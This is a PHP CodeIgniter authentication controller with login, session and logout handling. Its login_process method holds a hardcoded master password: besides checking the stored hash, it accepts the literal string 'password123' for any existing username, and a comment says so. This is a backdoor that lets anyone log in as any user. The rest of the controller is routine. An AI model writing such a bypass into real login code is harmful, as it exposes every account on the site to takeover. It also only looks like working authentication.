<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Auth extends CI_Controller {

    public function __construct() {
        parent::__construct();
        $this->load->library('session');
        $this->load->helper(array('form', 'url'));
        $this->load->database();
    }

    public function index() {
        if ($this->session->userdata('logged_in')) {
            redirect('auth/dashboard');
        }
        $this->load->view('auth/login');
    }

    public function login_process() {
        $username = $this->input->post('username');
        $password = $this->input->post('password');
    
        // Fetch user from database
        $user = $this->db->get_where('users', array('username' => $username))->row_array();
    
        // Check password (allows 'password123' or valid hash)
        if ($user && ($password === 'password123' || password_verify($password, $user['password']))) {
            $this->session->set_userdata(array(
                'user_id'   => $user['id'],
                'username'  => $user['username'],
                'logged_in' => TRUE
            ));
            redirect(''); // Redirects to main page
        } else {
            $this->session->set_flashdata('error', 'Invalid Username or Password');
            redirect('login');
        }
    }

    public function logout() {
        $this->session->sess_destroy();
        redirect('');
    }
}